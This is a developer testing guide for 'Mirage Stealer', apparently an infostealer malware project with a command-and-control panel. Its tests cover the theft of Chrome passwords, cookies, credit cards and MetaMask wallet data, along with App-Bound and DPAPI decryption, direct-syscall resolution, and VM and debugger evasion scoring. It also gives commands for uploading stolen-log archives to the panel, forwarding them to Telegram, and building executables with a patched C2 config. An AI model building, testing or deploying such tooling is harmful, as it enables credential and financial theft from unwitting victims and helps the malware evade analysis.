# Mirage Stealer — Testing Guide

## 1. Unit Tests

### 1.1 Running Tests

```bash
zig build test -Dtarget=x86_64-windows
```

Build configuration (from `build.zig`):
- Target: `x86_64-windows-msvc`
- Optimize: `Debug`
- Single-threaded: `true`

The test runner compiles `src/main.zig` as a test executable and runs all embedded tests.

### 1.2 Test Count

**192 tests** across the codebase:

| Module | File | Tests | What It Tests |
|--------|------|-------|---------------|
| Hash | `types/hash.zig` | 8 | XOR encrypt/decrypt identity, determinism, case-insensitivity, uniqueness of function vs module hashes, encrypted vs plain hash difference, non-zero, all unique |
| ChaCha20-Poly1305 | `crypto/chacha_poly.zig` | 6 | Roundtrip encrypt/decrypt, AAD mismatch rejection, empty input, tag verification, wrong key |
| Archive crypt | `crypto/archive_crypt.zig` | 5 | Key determinism, different nonce → different key, encrypt/decrypt roundtrip, empty input, tampered ciphertext, output too small |
| Chrome crypto | `crypto/chrome_crypto.zig` | 4 | PBKDF2 key derivation (via `deriveKey()`), decryptPassword edge cases (wrong version, short input), encryptedKey parsing (v1 DPAPI, v2 unsupported, empty) |
| Chrome key | `crypto/chrome_key.zig` | 4 | Base64 decode, JSON extraction of `encrypted_key`, missing key returns null, invalid base64 |
| DPAPI | `crypto/dpapi.zig` | 2 | Fake blob returns null, empty input returns null |
| Panel HTTP | `network/panel_http.zig` | 3 | Auth header format, parameter types, multipart boundary format |
| Archive crypt | `network/zip.zig` | 2 | CRC32 determinism, archive structure |
| sqLoot | `parsers/sqLoot.zig` | 14 | Header parsing, page parsing, record parsing, varint decoding, serial type sizes, column name extraction, overflow thresholds, magic validation, invalid DB handling, file I/O |
| Config | `config/config.zig` | 2 | Constants exist, SEED non-zero |
| File I/O | `parsers/file_io.zig` | 2 | Map + unmap roundtrip |
| Browser paths | `browsers/chromium_paths.zig` | 2 | 36 Chromium + 10 Gecko paths configured |
| App-Bound | `browsers/appbound.zig` | 4 | CLSID/IID for Chrome, Edge, Brave, Avast |
| Evasion | `evasion/evasion.zig` | 4 | RAM, CPU, screen checks return plausible values |

**Plus** the full debug test suite in `main.zig` (`runDebugTests()`), which runs ~70 assertions covering:
- Phase 1: Foundation (PEB walk, export resolution, SSN resolution, gadget pool, memory syscall test)
- Phase 2: Core Evasion (anti-analysis gate, PEB hide, mutex, BreakOnTermination)
- Phase 3: Crypto (DPAPI, AES-GCM, ChaCha20-Poly1305, archive encryption, Chrome key parser)
- Phase 4: Data Theft (sqLoot header/varint/record/column/file I/O, browser paths, App-Bound, Chrome decryption)

### 1.3 Adding New Tests

Tests use Zig's built-in `test` blocks:

```zig
test "my feature works correctly" {
    const result = myFunction();
    try std.testing.expect(result != null);
    try std.testing.expectEqual(@as(u32, 42), result.?);
}
```

Location conventions:
- **Unit tests** — alongside the function in the same file (e.g., `hash.zig` has inline tests)
- **Integration tests** — in `main.zig` under `runDebugTests()` with `assert()` helper
- **All 192 tests** are aggregated by `zig build test` automatically

Guidelines:
- Test edge cases: empty input, null, invalid data, tampered values
- Test both success and expected failure paths
- Use `comptime` tests where possible (zero cost, run at compile time)
- Avoid filesystem or network dependencies in unit tests
- Keep tests deterministic — no random data without fixed seed

---

## 2. Module Testing (Safe — No Exfiltration)

### 2.1 sqLoot SQLite Parser

```zig
// Create a minimal valid SQLite DB in memory
var db_buf: [4096]u8 = undefined;
@memset(&db_buf, 0);
@memcpy(db_buf[0..16], sqLoot.SQLITE_MAGIC);
std.mem.writeInt(u16, db_buf[16..18], 4096, .big);
db_buf[18] = 2; // write_version
db_buf[19] = 2; // read_version

var sqlite_db = sqLoot.SqliteDb.open(allocator, db_buf[0..200]) catch return;
defer sqlite_db.deinit();
// sqlite_db.header.page_size == 4096
```

What it tests: header parsing, page-size extraction, version bytes, magic validation.
**Safe:** Operates on in-memory buffer, no filesystem writes, no network.

### 2.2 Chrome Crypto

```zig
const key = chrome_crypto.deriveKey() catch return;
const decrypted = chrome_crypto.decryptPassword("v10\x00...", key);
// decrypted == null (expected — wrong key for mock data)
```

What it tests: PBKDF2 key derivation with `saltysalt`, AES-GCM nonce/tag extraction, Chrome v10 format parsing.
**Safe:** Pure computation with `std.crypto`, no disk or network I/O.

### 2.3 ChaCha20-Poly1305

```zig
var key: [32]u8 = undefined;
@memset(&key, 0x42);
var nonce: [12]u8 = undefined;
@memset(&nonce, 0x13);
const ct = chacha_poly.encrypt("Hello", key, nonce, "", &out);
const pt = chacha_poly.decrypt(ct.?, key, nonce, "", &dec);
// pt.? == "Hello"
```

What it tests: AEAD construction, tag verification, AAD binding, tamper detection.
**Safe:** Pure computation.

### 2.4 Archive Encryption

```zig
const ct = archive_crypt.encryptArchive("test data", &buf);
const pt = archive_crypt.decryptArchive(ct.?, &dec);
// pt.? == "test data"
```

What it tests: SEED-derived nonce, PBKDF2-based key, full encrypt/decrypt roundtrip.
**Safe:** Memory-only, no network or disk access.

### 2.5 Browser Paths (No File Access)

```zig
const browsers = chromium_paths.getChromiumBrowsers();
try testing.expect(browsers.len == 36);
try testing.expect(browsers[0].use_roaming == false); // Chrome uses local
```

What it tests: All 36 Chromium + 10 Gecko paths are configured, XOR-encrypted path integrity, roaming flag correctness.
**Safe:** Comptime data only — no file access.

### 2.6 ZIP Archive

```zig
var z = zip_mod.ZipWriter.init(allocator) catch return;
defer z.deinit();
z.addFile("test.txt", "Hello, World!") catch return;
const archive = z.finalize() catch return;
// archive contains valid PKZIP with CRC32 + local file header + central dir + EOCD
```

What it tests: CRC32 computation, file header structure, central directory, EOCD signature.
**Safe:** Memory-only ZIP construction.

---

## 3. Integration Test — Panel Log Ingestion

Test that the Panel correctly receives, parses, and stores a log:

```bash
# 1. Start the Panel (opens on port 8080)
cd Mirage.Panel
go run ./cmd/panel

# 2. Send a test ZIP via curl
curl -X POST http://127.0.0.1:8080/api/log \
  -H "Authorization: Bearer YOUR_AUTH_TOKEN" \
  -F "archive=@test_log.zip" \
  -F 'metadata={"hwid":"TEST-HWID","os":"Windows 10","username":"test","ip":"127.0.0.1"}'

# 3. Verify in database
sqlite3 data/mirage.db "SELECT COUNT(*) FROM sessions;"
sqlite3 data/mirage.db "SELECT * FROM passwords;"
```

### 3.1 Test ZIP Structure

```
test_log.zip
├── Browser Data/
│   ├── Chrome_Default_passwords.txt    # tab-separated: url\tusername\tpassword
│   ├── Chrome_Default_cookies.txt       # tab-separated: domain\t...\tname\tvalue
│   └── Chrome_Default_credit_cards.txt  # tab-separated: number\texp_month\texp_year\tholder
├── wallets/
│   └── MetaMask/
│       └── Local Extension Settings/
│           └── nkbihfbeogaeaoehlefnkodbefgpgknn/
│               └── log
└── system_info.txt
```

### 3.2 What It Validates

| Component | Validated |
|-----------|-----------|
| `LogProcessor.Process()` | ZIP parsing, category routing, path traversal protection |
| `ParsePasswords()` | Tab-delimited extraction, line splitting, empty line handling |
| `ParseCookies()` | 7-field tab parsing |
| `ParseCards()` | 4-field tab parsing |
| DB insert | Session + related entities saved in transaction |
| Telegram forward | Conditional on `TelegramToken` being set |
| Dashboard stats | `GET /api/stats` reflects new counts |

---

## 4. Syscall Test

Verify all 22 syscalls resolve to valid, unique SSNs:

```zig
// Run by: zig build test (these are in main.zig runDebugTests)
assert(engine.ssn_NtAllocateVirtualMemory != 0, "SSN non-zero");
assert(engine.ssn_NtClose != 0, "SSN non-zero");
assert(engine.ssn_NtAllocateVirtualMemory < 0x500, "SSN < 0x500");
assert(engine.ssn_NtAllocateVirtualMemory != engine.ssn_NtClose, "SSNs unique");
```

What to verify:
1. All 22 SSNs are **non-zero** — resolution succeeded
2. All SSNs are **< 0x500** — reasonable range for current Windows versions
3. No two SSNs are **identical** — each syscall resolved to a different number
4. Gadget pool has **> 0 entries** — `syscall; ret` gadgets found in ntdll
5. Gadget addresses point **within ntdll address range**

Expected output on Win10 22H2 / Win11 23H2 / Win11 24H2:
```
[  OK  ] ssn_NtAllocateVirtualMemory != 0
[  OK  ] ssn_NtClose != 0
[  OK  ] ssn_NtAllocateVirtualMemory < 0x500
[  OK  ] ssn uniqueness
[  OK  ] gadgets point within ntdll address range
```

---

## 5. Anti-Analysis Test

Run the stealer inside a VM and confirm it exits due to detection scoring:

```bash
# On a VirtualBox/VMware VM:
Mirage.exe
# Expected: process exits immediately with no data collected
# Exit code: 0 (clean exit from shouldExit())
```

### 5.1 What to Verify

| Check | Expected in VM | Expected on Host |
|-------|----------------|------------------|
| RAM | < 2 GB (VM with 1-4 GB) | > 4 GB |
| CPU cores | 1-2 cores | 4+ cores |
| VM registry | BIOS contains "VirtualBox"/"VMware" | Real manufacturer |
| Timing | rdtsc delta > 10M (VM instruction emulation) | < 1M |
| Score | > 60 (exit) | < 60 (continue) |
| Debugger | NtQueryInformationProcess returns debug port | No debug port |

### 5.2 Debug Output Mode

```bash
# Compile with debug output enabled
# Edit is_debug in main.zig to true, then:
zig build -Dtarget=x86_64-windows -Doptimize=Debug

# Run — prints all checks:
Mirage.exe
# === Phase 2: Core Evasion ===
#   RAM: 2048 MB
#   CPU cores: 2
#   Screen: 1280x720
#   Weighted score: 45
# [  OK  ] evasion score below threshold
```

---

## 6. Network Test

### 6.1 Panel Receipt Test

```bash
# Terminal 1: Start Panel
cd Mirage.Panel
dotnet run

# Terminal 2: Send test log
python -c "
import requests
# Create minimal test ZIP
import zipfile, io
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('Browser Data/Chrome_passwords.txt', 'example.com\\tuser\\tpass123\\n')
    z.writestr('system_info.txt', 'OS: Windows 10\\nCPU: Intel\\n')
buf.seek(0)

r = requests.post(
    'http://127.0.0.1:8080/api/log',
    files={'archive': ('test.zip', buf, 'application/zip')},
    data={'metadata': '{\"hwid\":\"TEST\",\"os\":\"Win10\",\"username\":\"tester\",\"ip\":\"1.2.3.4\"}'},
    headers={'Authorization': 'Bearer <token>'}
)
print(r.status_code)  # Expected: 200
"
```

### 6.2 What to Verify

1. Panel logs show `POST /api/log 200`
2. `data/mirage.db` contains new row in `sessions`
3. `data/mirage.db` contains password in `passwords` table
4. `GET /api/stats` reflects new data
5. Archive saved to `logs/` directory

### 6.3 Telegram Backup Test

```bash
# Set TelegramToken + TelegramChatId in Panel settings
# Send test log (same as above)
# Verify message arrives in Telegram chat
```

---

## 7. Build Test

### 7.1 BuildService Integrity

```bash
# 1. Build the stealer
cd Mirage.Stealer
zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall
# Produces: zig-out/bin/Mirage.exe

# 2. Open Panel, go to Build page
# 3. Select Mirage.exe as stealer
# 4. Configure C2 host/port (e.g., 127.0.0.1:8443)
# 5. Click [Build] → save as mirage_built.exe

# 6. Verify output
# Expected size: 80-150 KB (slightly larger than original due to overlay + config)
```

### 7.2 PE Integrity Checks

```bash
# Check PE signature
python -c "
import struct
with open('mirage_built.exe', 'rb') as f:
    data = f.read()
    # MZ header
    assert data[0:2] == b'MZ', 'Missing MZ header'
    # PE signature at offset from e_lfanew
    pe_offset = struct.unpack('<I', data[0x3C:0x40])[0]
    assert data[pe_offset:pe_offset+4] == b'PE\x00\x00', 'Missing PE signature'
    # MIRAGECFG signature present
    assert b'MIRAGECFG' in data, 'Missing config signature'
    # Sections: .text, .rdata, .data
    print(f'File size: {len(data)} bytes')
    print('PE integrity: OK')
"
```

### 7.3 Config Patched Correctly

```bash
# Verify config bytes at MIRAGECFG offset are different from original
python -c "
with open('Mirage.exe', 'rb') as f:
    orig = f.read()
with open('mirage_built.exe', 'rb') as f:
    built = f.read()

orig_idx = orig.find(b'MIRAGECFG')
built_idx = built.find(b'MIRAGECFG')

# After MIRAGECFG, the original has XOR-encrypted placeholder bytes
# The built version has AES-GCM encrypted config
orig_config = orig[orig_idx+9:orig_idx+9+100]
built_config = built[built_idx+9:built_idx+9+100]

assert orig_config != built_config, 'Config was not patched!'
assert len(built) >= len(orig), 'Built file smaller than original (missing overlay?)'
print(f'Config patched: YES')
print(f'Overlay present: {\"YES\" if len(built) > len(orig) else \"NO\"} ({(len(built)-len(orig))/1024:.1f} KB)')
"
```

---

## 8. Quick Reference

```bash
# Run all unit tests (192 tests)
zig build test -Dtarget=x86_64-windows

# Run debug test suite (in-process, ~70 assertions)
zig build -Dtarget=x86_64-windows -Doptimize=Debug
.\zig-out\bin\Mirage.exe    # see CONOUT$ output

# Build release
zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall

# Build Panel
cd Mirage.Panel
go build -o panel.exe ./cmd/panel
./panel.exe                  # starts server on port 8080

# Send test log
curl -X POST http://127.0.0.1:8080/api/log \
  -H "Authorization: Bearer <token>" \
  -F "archive=@test.zip" \
  -F 'metadata={"hwid":"TEST","os":"Win10"}'

# Verify database
sqlite3 data/mirage.db ".tables"
sqlite3 data/mirage.db "SELECT COUNT(*) FROM sessions;"
sqlite3 data/mirage.db "SELECT url, username, password_value FROM passwords LIMIT 10;"
```
